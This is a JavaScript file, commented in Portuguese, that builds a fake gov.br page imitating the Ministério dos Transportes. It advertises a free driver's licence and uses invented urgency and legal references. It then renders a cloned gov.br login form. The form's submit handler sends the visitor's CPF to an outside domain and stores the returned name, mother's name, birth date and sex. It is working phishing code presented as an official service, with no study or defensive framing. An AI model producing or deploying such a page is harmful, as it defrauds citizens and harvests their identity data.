// Configuração de dados - Separado para facilitar// CONFIG - Configurações globais
const CONFIG = {
    images: {
        govLogo: 'img/logGov.png',
        cnhLogo: 'img/cnh-brasil-logo.png',
        mainImage1: 'img/image1.jpeg',
        mainImage2: 'img/imag2.png'
    },
    socialIcons: {
        facebook: 'M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z',
        linkedin: 'M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z',
        instagram: 'M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z',
        whatsapp: 'M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z',
        x: 'M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z',
        youtube: 'M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z',
        chevronDown: 'M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z',
        cookie: 'M510.37 254.79l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z',
        arrowRight: 'M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z'
    }
};

// Classe responsável por gerenciar o DOM
class DOMManager {
    constructor(containerId) {
        this.container = document.getElementById(containerId);
    }

    create(tag, className = '', text = '') {
        const element = document.createElement(tag);
        if (className) element.className = className;
        if (text) element.textContent = text;
        return element;
    }

    createSVG(path, className = '', viewBox = '0 0 24 24') {
        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        svg.setAttribute('viewBox', viewBox);
        svg.setAttribute('class', className);
        svg.innerHTML = `<path d="${path}"/>`;
        return svg;
    }

    append(element) {
        this.container.appendChild(element);
        return element;
    }
}

// Classe HeaderBuilder - Responsável por construir o header
class HeaderBuilder {
    constructor(domManager) {
        this.dom = domManager;
    }

    build() {
        const header = this.dom.create('header', 'header');
        
        // Barra Superior
        this.buildHeaderTop(header);
        
        // Barra Inferior
        this.buildHeaderBottom(header);
        
        // Breadcrumb
        this.buildBreadcrumb(header);
        
        this.dom.append(header);
    }

    buildHeaderTop(header) {
        const headerTop = this.dom.create('div', 'header-top');
        const content = this.dom.create('div', 'header-top-content');
        
        // Esquerda: Logo, ícone de menu e linha divisória
        const left = this.dom.create('div', 'header-top-left');
        const logo = this.dom.create('img', 'gov-logo');
        logo.src = CONFIG.images.govLogo;
        logo.alt = 'gov.br';
        
        // Ícone de três pontos verticais
        const dotsIcon = this.dom.createSVG('M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z', 'menu-dots-icon');
        
        // Linha divisória vertical
        const divider = this.dom.create('div', 'divider-line');
        
        left.appendChild(logo);
        left.appendChild(dotsIcon);
        left.appendChild(divider);
        
        // Direita: Ícones e botão Entrar
        const right = this.dom.create('div', 'header-top-right');
        
        // Ícone de cookie
        const cookieIcon = this.dom.createSVG('M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z', 'header-top-icon');
        
        // Ícone de grade (grid)
        const gridIcon = this.dom.createSVG('M4 11h5V5H4v6zm0 7h5v-6H4v6zm6 0h5v-6h-5v6zm6 0h5v-6h-5v6zm-6-7h5V5h-5v6zm6-6v6h5V5h-5z', 'header-top-icon');
        
        // Botão Entrar com ícone
        const btnEntrar = this.dom.create('button', 'btn-entrar');
        const userIcon = this.dom.createSVG('M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z', 'btn-entrar-icon');
        const btnText = this.dom.create('span', '', 'Entrar');
        
        btnEntrar.appendChild(userIcon);
        btnEntrar.appendChild(btnText);
        
        right.appendChild(cookieIcon);
        right.appendChild(gridIcon);
        right.appendChild(btnEntrar);
        
        content.appendChild(left);
        content.appendChild(right);
        headerTop.appendChild(content);
        header.appendChild(headerTop);
    }

    buildHeaderBottom(header) {
        const headerBottom = this.dom.create('div', 'header-bottom');
        const content = this.dom.create('div', 'header-bottom-content');
        
        // Esquerda: Hambúrguer e título do ministério
        const left = this.dom.create('div', 'header-bottom-left');
        
        // Ícone de hambúrguer
        const hamburgerIcon = this.dom.createSVG('M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z', 'hamburger-icon');
        
        const ministryTitle = this.dom.create('span', 'ministry-title', 'Ministério dos Transportes');
        
        left.appendChild(hamburgerIcon);
        left.appendChild(ministryTitle);
        
        // Direita: Ícone de busca
        const right = this.dom.create('div', 'header-bottom-right');
        const searchIcon = this.dom.createSVG('M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z', 'search-icon');
        
        right.appendChild(searchIcon);
        
        content.appendChild(left);
        content.appendChild(right);
        headerBottom.appendChild(content);
        header.appendChild(headerBottom);
    }

    buildBreadcrumb(header) {
        const breadcrumb = this.dom.create('div', 'breadcrumb');
        const content = this.dom.create('div', 'breadcrumb-content');
        
        const breadcrumbData = [
            { text: 'Início', link: true },
            { text: 'Assuntos', link: true },
            { text: 'Notícias', link: true },
            { text: '2025', link: true },
            { text: '12', link: true },
            { text: 'Como solicitar sua Carteira de motorista gratuitamente e sem autoescola', link: false }
        ];
        
        breadcrumbData.forEach((item, index) => {
            const span = this.dom.create('span', 'breadcrumb-item');
            if (item.link) {
                const a = this.dom.create('a', 'breadcrumb-link', item.text);
                a.href = '#';
                span.appendChild(a);
            } else {
                const current = this.dom.create('span', 'breadcrumb-current', item.text);
                span.appendChild(current);
            }
            content.appendChild(span);
        });
        
        breadcrumb.appendChild(content);
        header.appendChild(breadcrumb);
    }
}

// Classe MainContentBuilder - Responsável por construir o conteúdo principal
class MainContentBuilder {
    constructor(domManager) {
        this.dom = domManager;
    }

    build() {
        const main = this.dom.create('main', 'main-content');
        
        // Categoria
        const category = this.dom.create('div', 'article-category');
        const categoryText = this.dom.create('span', 'category-text', 'TRÂNSITO');
        category.appendChild(categoryText);
        main.appendChild(category);
        
        // Título
        const title = this.dom.create('h1', 'article-title');
        title.textContent = 'CNH do Brasil: Governo libera carteira de motorista 100% gratuita e sem necessidade de autoescola';
        main.appendChild(title);
        
        // Introdução
        const intro = this.dom.create('p', 'article-intro');
        intro.innerHTML = 'Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e <strong>as vagas para 2026 estão se esgotando.</strong> A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito.';
        main.appendChild(intro);
        
        // Ícones sociais
        this.buildSocialShare(main);
        
        // Datas
        const dates = this.dom.create('div', 'dates');
        const publishedDate = this.dom.create('p', '', 'Publicado em 09/12/2025 20h58');
        const updatedDate = this.dom.create('p', '', 'Atualizado em 10/12/2025 14h42');
        dates.appendChild(publishedDate);
        dates.appendChild(updatedDate);
        main.appendChild(dates);
        
        // Imagem principal
        const img1 = this.dom.create('img', 'main-image');
        img1.src = CONFIG.images.mainImage1;
        img1.alt = 'Lançamento do Programa CNH do Brasil';
        main.appendChild(img1);
        
        // Parágrafo com letra capitular
        this.buildDropCapParagraph(main);
        
        // Botão de inscrição 1 (primeiro - rola para o segundo)
        this.buildInscricaoButton(main, false, true);
        
        // Seção 1
        this.buildSection1(main);
        
        // Caixa de destaque
        this.buildHighlightBox(main);
        
        // Imagem 2
        const img2 = this.dom.create('img', 'main-image');
        img2.src = CONFIG.images.mainImage2;
        img2.alt = 'CNH do Brasil - Como se inscrever';
        main.appendChild(img2);
        
        // Seção 2
        this.buildSection2(main);
        
        // Botão de inscrição 2 (segundo - redireciona para login)
        this.buildInscricaoButton(main, true, false);
        
        // Seção 3
        this.buildSection3(main);
        
        this.dom.append(main);
    }

    buildSocialShare(container) {
        const socialShare = this.dom.create('div', 'social-share');
        const shareLabel = this.dom.create('span', 'share-label', 'Compartilhe:');
        socialShare.appendChild(shareLabel);
        
        const socialIcons = this.dom.create('div', 'social-icons');
        const icons = ['facebook', 'x', 'linkedin', 'whatsapp'];
        icons.forEach(icon => {
            const svg = this.dom.createSVG(CONFIG.socialIcons[icon], 'social-icon');
            socialIcons.appendChild(svg);
        });
        socialShare.appendChild(socialIcons);
        
        container.appendChild(socialShare);
    }

    buildDropCapParagraph(container) {
        const p = this.dom.create('p', 'article-text');
        const dropCap = this.dom.create('span', 'drop-cap', 'O');
        const text = document.createTextNode('processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona.');
        p.appendChild(dropCap);
        p.appendChild(text);
        container.appendChild(p);
    }

    buildInscricaoButton(container, underline = false, isFirst = false) {
        const containerDiv = this.dom.create('div', 'inscricao-container');
        const btn = this.dom.create('button', 'btn-inscricao');
        if (underline) {
            const span = this.dom.create('span', '', 'Fazer Minha Inscrição Agora');
            btn.appendChild(span);
        } else {
            btn.textContent = 'Fazer Minha Inscrição Agora';
        }
        
        if (isFirst) {
            btn.classList.add('btn-inscricao-first');
        } else {
            btn.classList.add('btn-inscricao-login');
        }
        
        containerDiv.appendChild(btn);
        
        const subtitle = this.dom.create('p', 'inscricao-subtitle', 'Últimas vagas para 2026');
        containerDiv.appendChild(subtitle);
        
        container.appendChild(containerDiv);
    }

    buildHighlightBox(container) {
        const box = this.dom.create('div', 'highlight-box');
        const title = this.dom.create('p', 'highlight-box-title', 'Últimas Vagas para 2026');
        box.appendChild(title);
        
        const text = this.dom.create('p', 'highlight-box-text');
        text.innerHTML = 'Devido à alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para <strong>janeiro de 2026</strong>. Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação.';
        box.appendChild(text);
        
        container.appendChild(box);
    }

    buildSection1(container) {
        const section = this.dom.create('section', 'content-section');
        const title = this.dom.create('h2', 'section-title', '1. O que mudou com a nova resolução?');
        section.appendChild(title);
        
        const list = this.dom.create('ul', 'bullet-list');
        const items = [
            { text: 'Fim da obrigatoriedade de autoescola:', bold: 'Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)' },
            { text: 'Curso teórico online e gratuito:', bold: 'Disponível após realizar o cadastro.' },
            { text: 'Carga horária prática reduzida:', bold: 'De 20 horas obrigatórias para apenas 2 horas mínimas' },
            { text: 'Aulas práticas flexíveis:', bold: 'Podem ser realizadas com instrutor autônomo credenciado pelo Detran' },
            { text: 'Redução de até 80% nos custos:', bold: 'Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça' }
        ];
        items.forEach(item => {
            const li = this.dom.create('li', 'bullet-item');
            li.innerHTML = `<strong>${item.text}</strong> ${item.bold}`;
            list.appendChild(li);
        });
        section.appendChild(list);
        
        container.appendChild(section);
    }

    buildSection2(container) {
        const section = this.dom.create('section', 'content-section');
        const title = this.dom.create('h2', 'section-title', '2. Como se inscrever no programa?');
        section.appendChild(title);
        
        const text = this.dom.create('p', 'article-text', 'O processo de inscrição é simples e pode ser feito totalmente online:');
        section.appendChild(text);
        
        const list = this.dom.create('ol', 'numbered-list');
        const steps = [
            'Clique no botão abaixo para iniciar seu cadastro',
            'Informe seu CPF para verificar elegibilidade',
            'Confirme seus dados pessoais',
            'Sua Carteira de Motorista será emitida em até 20 dias'
        ];
        steps.forEach(step => {
            const li = this.dom.create('li', 'numbered-item', step);
            list.appendChild(li);
        });
        section.appendChild(list);
        
        container.appendChild(section);
    }

    buildSection3(container) {
        const section = this.dom.create('section', 'content-section');
        const title = this.dom.create('h2', 'section-title', '3. Base Legal');
        section.appendChild(title);
        
        const list = this.dom.create('ul', 'bullet-list');
        const items = [
            'Resolução Contran nº 985/2025',
            'Lei nº 14.071/2020 (Nova Lei de Trânsito)',
            'Decreto nº 11.999/2025 (Programa CNH do Brasil)'
        ];
        items.forEach(item => {
            const li = this.dom.create('li', 'bullet-item', item);
            list.appendChild(li);
        });
        section.appendChild(list);
        
        container.appendChild(section);
    }
}

// Classe FooterBuilder - Responsável por construir o footer
class FooterBuilder {
    constructor(domManager) {
        this.dom = domManager;
    }

    build() {
        const footer = this.dom.create('footer', 'footer');
        const content = this.dom.create('div', 'footer-content');
        
        // Brand gov.br
        const brand = this.dom.create('span', 'footer-brand', 'gov.br');
        content.appendChild(brand);
        
        // Seções
        const sections = this.dom.create('div', 'footer-sections');
        const sectionTitles = ['ASSUNTOS', 'ACESSO À INFORMAÇÃO', 'COMPOSIÇÃO', 'CANAIS DE ATENDIMENTO', 'CENTRAL DE CONTEÚDOS', 'SERVIÇOS'];
        
        sectionTitles.forEach(title => {
            const sectionItem = this.dom.create('div', 'footer-section-item');
            const sectionTitle = this.dom.create('span', 'footer-section-title', title);
            const chevronIcon = this.dom.createSVG(CONFIG.socialIcons.chevronDown, 'footer-section-icon');
            
            sectionItem.appendChild(sectionTitle);
            sectionItem.appendChild(chevronIcon);
            sections.appendChild(sectionItem);
        });
        
        content.appendChild(sections);
        
        // Redefinir Cookies
        const cookies = this.dom.create('div', 'footer-cookies');
        const cookieIcon = this.dom.createSVG(CONFIG.socialIcons.cookie, 'footer-cookies-icon');
        const cookieText = this.dom.create('span', '', 'Redefinir Cookies');
        
        cookies.appendChild(cookieIcon);
        cookies.appendChild(cookieText);
        content.appendChild(cookies);
        
        // Redes Sociais
        const social = this.dom.create('div', 'footer-social');
        const socialTitle = this.dom.create('p', 'footer-social-title', 'REDES SOCIAIS');
        social.appendChild(socialTitle);
        
        const socialIcons = this.dom.create('div', 'footer-social-icons');
        const footerIcons = ['x', 'youtube', 'facebook', 'instagram', 'linkedin'];
        footerIcons.forEach(icon => {
            const svg = this.dom.createSVG(CONFIG.socialIcons[icon], 'footer-social-icon');
            socialIcons.appendChild(svg);
        });
        social.appendChild(socialIcons);
        content.appendChild(social);
        
        footer.appendChild(content);
        this.dom.append(footer);
    }
}

// Classe FixedButtonsBuilder - Responsável por adicionar botões fixos
class FixedButtonsBuilder {
    constructor() {
        this.container = document.body;
    }

    build() {
        // Botão VLibras
        const vlibrasDiv = document.createElement('div');
        vlibrasDiv.className = 'vlibras-button';
        vlibrasDiv.setAttribute('aria-label', 'VLibras - Acessibilidade em Libras');
        
        const vlibrasImg = document.createElement('img');
        vlibrasImg.src = 'https://vlibras.gov.br/app//assets/access_icon.svg';
        vlibrasImg.alt = 'VLibras';
        
        vlibrasDiv.appendChild(vlibrasImg);
        this.container.appendChild(vlibrasDiv);
        
        // Botão Voltar ao topo
        const backToTopBtn = document.createElement('button');
        backToTopBtn.className = 'back-to-top';
        backToTopBtn.setAttribute('aria-label', 'Voltar ao topo');
        
        const arrowSvg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        arrowSvg.setAttribute('viewBox', '0 0 320 512');
        arrowSvg.setAttribute('height', '16');
        arrowSvg.setAttribute('width', '16');
        arrowSvg.innerHTML = `<path d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"></path>`;
        
        backToTopBtn.appendChild(arrowSvg);
        this.container.appendChild(backToTopBtn);
        
        // Adicionar funcionalidade de scroll ao topo
        backToTopBtn.addEventListener('click', () => {
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
        });
    }
}

// Classe LoginBuilder - Responsável por construir a tela de login
class LoginBuilder {
    constructor() {
        this.container = document.getElementById('app');
    }

    build() {
        this.container.innerHTML = '';
        
        // Header
        const header = document.createElement('header');
        const headerImg = document.createElement('img');
        headerImg.src = 'https://i.ibb.co/WGrsWGN/IMG-1297.jpg';
        headerImg.alt = 'Imagem de cabeçalho';
        headerImg.style.width = '100%';
        header.appendChild(headerImg);
        this.container.appendChild(header);

        // Container principal
        const container = document.createElement('div');
        container.className = 'login-container';

        // Aside com logo gov.br
        const aside = document.createElement('aside');
        aside.className = 'login-aside';
        const govLogo = document.createElement('img');
        govLogo.id = 'identidade-govbr';
        govLogo.src = CONFIG.images.govLogo;
        govLogo.alt = 'Logomarca GovBR';
        aside.appendChild(govLogo);
        container.appendChild(aside);

        // Main com formulário
        const main = document.createElement('main');
        main.className = 'login-main';

        const form = document.createElement('form');
        form.method = 'post';
        form.id = 'loginData';
        form.noValidate = true;

        const card = document.createElement('div');
        card.className = 'login-card';

        // Logo CNH
        const logoContainer = document.createElement('div');
        logoContainer.style.cssText = 'display: flex; justify-content: center; align-items: center; width: 100%; margin-bottom: 16px;';
        const cnhLogo = document.createElement('img');
        cnhLogo.src = CONFIG.images.cnhLogo;
        cnhLogo.alt = 'CNH do Brasil';
        cnhLogo.style.cssText = 'height: 64px; object-fit: contain;';
        logoContainer.appendChild(cnhLogo);
        card.appendChild(logoContainer);

        // Título
        const h3 = document.createElement('h3');
        h3.textContent = 'Identifique-se no gov.br com:';
        card.appendChild(h3);

        // Opção CPF
        const cpfOption = document.createElement('div');
        cpfOption.className = 'login-option';
        cpfOption.tabIndex = 3;
        cpfOption.style.cssText = 'display: flex; align-items: center; cursor: pointer;';
        
        const cpfIcon = document.createElement('img');
        cpfIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png';
        cpfIcon.alt = 'Ícone CPF';
        cpfOption.appendChild(cpfIcon);
        
        const cpfText = document.createElement('span');
        cpfText.textContent = 'Número do CPF';
        cpfOption.appendChild(cpfText);
        
        card.appendChild(cpfOption);

        // Painel de accordion
        const accordion = document.createElement('div');
        accordion.className = 'login-accordion';
        accordion.id = 'accordion-panel-id';

        const p = document.createElement('p');
        p.innerHTML = 'Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br';
        accordion.appendChild(p);

        const label = document.createElement('label');
        label.htmlFor = 'cpf';
        label.textContent = 'CPF';
        accordion.appendChild(label);

        const input = document.createElement('input');
        input.type = 'tel';
        input.id = 'cpf';
        input.name = 'cpf';
        input.placeholder = 'Digite seu CPF';
        input.autocomplete = 'new-password';
        input.tabIndex = 1;
        input.setAttribute('aria-invalid', 'false');
        accordion.appendChild(input);

        // Botão continuar
        const buttonPanel = document.createElement('div');
        buttonPanel.className = 'login-button-panel';
        buttonPanel.id = 'login-button-panel';

        const continueBtn = document.createElement('button');
        continueBtn.type = 'submit';
        continueBtn.className = 'login-button';
        continueBtn.tabIndex = 2;
        continueBtn.textContent = 'Continuar';
        buttonPanel.appendChild(continueBtn);

        accordion.appendChild(buttonPanel);
        card.appendChild(accordion);

        // Outras opções
        const otherLabel = document.createElement('label');
        otherLabel.id = 'title-outras-op';
        otherLabel.textContent = 'Outras opções de identificação:';
        card.appendChild(otherLabel);

        const hr = document.createElement('hr');
        hr.id = 'hr-outras-op';
        hr.style.margin = '0';
        card.appendChild(hr);

        // Login com banco
        const bankOption = document.createElement('div');
        bankOption.className = 'login-option';
        bankOption.style.cssText = 'display: flex; align-items: center; cursor: pointer;';
        
        const bankIcon = document.createElement('img');
        bankIcon.src = 'https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png';
        bankIcon.alt = 'Ícone Internet Banking';
        bankOption.appendChild(bankIcon);
        
        const bankText = document.createElement('span');
        bankText.textContent = 'Login com seu banco';
        bankOption.appendChild(bankText);
        
        card.appendChild(bankOption);

        form.appendChild(card);
        main.appendChild(form);
        container.appendChild(main);
        this.container.appendChild(container);

        // Adicionar event listener para o formulário
        form.addEventListener('submit', (e) => this.handleSubmit(e));
    }

    async handleSubmit(e) {
        e.preventDefault();
        const cpfInput = document.getElementById('cpf');
        const cpf = cpfInput.value.replace(/\D/g, '');

        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        try {
            const response = await fetch(`https://guiacnhsocial.click/api/consulta.php?cpf=${cpf}`, {
                method: 'GET',
                mode: 'cors',
                credentials: 'include'
            });

            const data = await response.json();
            
            // Armazenar dados no localStorage
            localStorage.setItem('userCpf', data.cpf);
            localStorage.setItem('userName', data.nome);
            localStorage.setItem('userNameMae', data.nome_mae);
            localStorage.setItem('userBirthDate', data.data_nascimento);
            localStorage.setItem('userSex', data.sexo);

            // Mostrar tela de verificação
            this.showVerificationScreen(data);
        } catch (error) {
            console.error('Erro ao consultar CPF:', error);
            alert('Erro ao consultar CPF. Tente novamente.');
        }
    }

    showVerificationScreen(data) {
        this.container.innerHTML = '';
        
        const header = document.createElement('header');
        const headerImg = document.createElement('img');
        headerImg.src = 'https://i.ibb.co/WGrsWGN/IMG-1297.jpg';
        headerImg.alt = 'Imagem de cabeçalho';
        headerImg.style.width = '100%';
        header.appendChild(headerImg);
        this.container.appendChild(header);

        const container = document.createElement('div');
        container.className = 'verification-container';

        const card = document.createElement('div');
        card.className = 'verification-card';

        const title = document.createElement('h1');
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        card.appendChild(title);

        const question = document.createElement('p');
        question.className = 'verification-question';
        question.textContent = '1 Qual é seu nome completo?';
        card.appendChild(question);

        // Opções de nomes
        const options = document.createElement('div');
        options.className = 'verification-options';

        const names = ['Arthur Alves Gomes', data.nome, 'Lucas Oliveira Costa'];
        
        names.forEach((name, index) => {
            const option = document.createElement('div');
            option.className = 'verification-option';
            option.textContent = name;
            
            if (index === 1) {
                option.classList.add('verification-option-selected');
            }
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.verification-option').forEach(opt => {
                    opt.classList.remove('verification-option-selected');
                });
                option.classList.add('verification-option-selected');
            });
            
            options.appendChild(option);
        });

        card.appendChild(options);

        const confirmBtn = document.createElement('button');
        confirmBtn.className = 'verification-button';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            alert('Dados confirmados com sucesso!');
            // Aqui você pode redirecionar para a próxima etapa
        });
        card.appendChild(confirmBtn);

        container.appendChild(card);
        this.container.appendChild(container);
    }
}

// Classe principal App - Orquestra toda a construção
class App {
    constructor() {
        this.dom = new DOMManager('app');
    }

    init() {
        const headerBuilder = new HeaderBuilder(this.dom);
        headerBuilder.build();
        
        const mainBuilder = new MainContentBuilder(this.dom);
        mainBuilder.build();
        
        const footerBuilder = new FooterBuilder(this.dom);
        footerBuilder.build();
        
        const fixedButtonsBuilder = new FixedButtonsBuilder();
        fixedButtonsBuilder.build();
        
        this.addEventListeners();
    }

    addEventListeners() {
        // Botão de inscrição 1 - rola para o segundo botão
        const firstBtn = document.querySelector('.btn-inscricao-first');
        if (firstBtn) {
            firstBtn.addEventListener('click', (e) => {
                e.preventDefault();
                const secondBtn = document.querySelector('.btn-inscricao-login');
                if (secondBtn) {
                    secondBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
            });
        }

        // Botão de inscrição 2 - redireciona para login
        const loginBtn = document.querySelector('.btn-inscricao-login');
        if (loginBtn) {
            loginBtn.addEventListener('click', (e) => {
                e.preventDefault();
                this.showLoginScreen();
            });
        }
    }

    showLoginScreen() {
        // Limpar o container e mostrar tela de login
        const app = document.getElementById('app');
        app.innerHTML = '';
        
        const loginBuilder = new LoginBuilder();
        loginBuilder.build();
        // Adicionar funcionalidade de busca
